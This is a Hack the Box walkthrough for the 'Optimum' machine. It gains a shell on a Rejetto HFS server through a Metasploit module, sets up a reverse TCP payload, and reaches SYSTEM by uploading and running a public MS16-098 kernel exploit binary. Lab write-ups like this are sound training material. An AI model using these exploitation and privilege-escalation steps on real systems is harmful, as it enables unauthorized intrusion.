# Hack the Box - Optimum

##### If you want to go straight to the solution and skip some extra notes skip the first priv. escalation attempt

### Enumeration

First, we do a basic nmap scan: ```nmap -sC -sV -oA NAME 10.10.10.8```. This will scan the service and ports and save the results into whatever we named the file.

Here are the results:

So from the nmap scan, we can see the box involved is running a Windows HTTP File Server with port 80 open. Checking out the main page we don't see much, though on the bottom left there's a box titled ```Server Information``` that can give us some more info:

Here's the webpage it leads to: ```https://www.rejetto.com/hfs/```. Picture shown below.

Here we can see some more information about the service it's running. Look up and researching about ```rejetto HFS server```, I discover there's potentially a metasploit module. So I decided to open up metasploit. 

### Exploitation

Doing a ```search rejetto``` on metasploit reveals there's an exploit module: ```exploit/windows/http/rejetto_hfs_exec```

I then do ```set RHOST 10.10.10.8``` which sets the target IP address. Here's how it looked like:

![image](https://user-images.githubusercontent.com/41026969/65071120-fa885200-d95b-11e9-8af7-0784b05fa47a.png)

When running the module, we get a meterpreter shell!

##### Getting the user flag

Doing ```sysinfo``` reveals the following:

```
meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
```

Now we have more information about the box, the version of the OS. 

From meterpreter we can do ```shell``` to get a local shell inside the windows box. Doing ```whoami``` reveals that we are user ```kostas```. Doing a ```dir``` check reveals the user flag:

Since we got a user shell, we need to work on a privilege escalation.

##### Further enumeration - first priv. escalation attempt

You can save your meterpreter session to go back to it later by ```exit``` out of shell, then when you are in the metrepreter terminal, you can enter ```background```

One of the methods to potentially find an exploit now that we got a local shell, is to use the local exploit suggester moduel found on metasploit. You can do ```search suggester``` and the module ```post/multi/recon/local_exploit_suggester``` should pop up. 

Do ```use post/multi/recon/local_exploit_suggester```. And then set the ```SESSION``` to whatever your meterpreter session number was.  When everything is set, do ```run```. Here's a picture of this process shown below:

![image](https://user-images.githubusercontent.com/41026969/66246889-ea0b0200-e6e5-11e9-96a6-6b13be1ab007.png)

Here's a picture of the output:

![image](https://user-images.githubusercontent.com/41026969/66247022-bd0b1f00-e6e6-11e9-9c0f-9e03fb46f486.png)

One of the results show a metasploit module that could potentially work ```exploit/windows/local/ms16_032_secondary_logon_handle_privesc```. 

So I do ```use exploit/windows/local/ms16_032_secondary_logon_handle_privesc``` then I set ```set SESSION 1``` (that's my meterpreter session number)

To have the best chances of success, I want everything to be set on x64 bit architecture. So I need to make sure that the payload, the process we're currently on, and the ```TARGET``` is all set to something that is 64 bit. The process I did is listed below

We need to set the payload to something x64 bit, do ```search reverse_tcp``` and one of the payloads should be ```payload/windows/x64/shell/reverse_tcp```. To set the payload do ```set payload windows/x64/shell/reverse_tcp```. For the payload options, remember to ```set LHOST [YOUR IP]```.

Now we need to make sure the process we're on is a x64 bit process, go back to your session by doing ```session 1``` (or whatever your session number is). Do ```ps``` and one of the processes should be ```explorer.exe``` the left column should be the ```PID``` and that's what we need. On the meterpreter shell, do ```migrate [PID].```

Now we just need to ```set target 1``` to ensure exploit target is Windows x64.

One last check we should do is that in our meterpreter session, we should check if we have all read/write permissions. Doing a ```pwd``` reveals we are in ```C:\Windows\system32``` and we don't have full permissions. Since we are user ```kostas``` we can simply switch to their directory ```C:\Users\kostas\Desktop```.

Now this should work:

Unfortunately it doesn't... When I initially did this method, I checked with other sources and noted what they did in their versions of getting admin using metasploit, and they did the same thing, so I decided to try something else:

### A new approach to getting escalated privileges

This time around, I decide to use [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester). Since we have the shell from the earlier meterpreter session, doing ```shell``` and then doing ```systeminfo``` will print out even more information which includes some hotfixes. 

I downloaded the ```windows-exploit-suggester.py``` file from the link above. If you this is the first time using it, you'd need to calibrate it:

1. ```python windows-exploit-suggester.py --update``` (should get an xls or xlsx file)
2. ```pip install xlrd```

Now copy/paste the output from the ```systeminfo``` from above into a .txt file. Also note where the .xls file is from step 1 above.

To run the exploit suggester: ```python windows-exploit-suggester.py --database [path to .xls file] --systeminfo [path to systeminfo .txt file]```. For example, my command looked like this: ```python Windows-Exploit-Suggester/windows-exploit-suggester.py --database Windows-Exploit-Suggester/2019-10-04-mssb.xls --systeminfo htb-optimum/sysinfo.txt```

Running the python program gives us the following result:

After some testing and researching about the potential exploits we could use, one I ran into was [MS16-098](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098).

After reading the Usage part of the github linked above, I downloaded the ```bfill.exe``` file. Now, using the meterpreter shell from earlier we need to upload the exe and then run it on the victim's machine:

From the meterpreter session ```upload bfill.exe```. Then after, we simply run it on the windows shell:

Doing a ```whoami``` shows we are ```nt authority\system```! Box rooted.

### Flags
user: ```C:\Users\kostas\Destop\user.txt.txt```

root: ```C:\Users\Administrator\Desktop\root.txt```
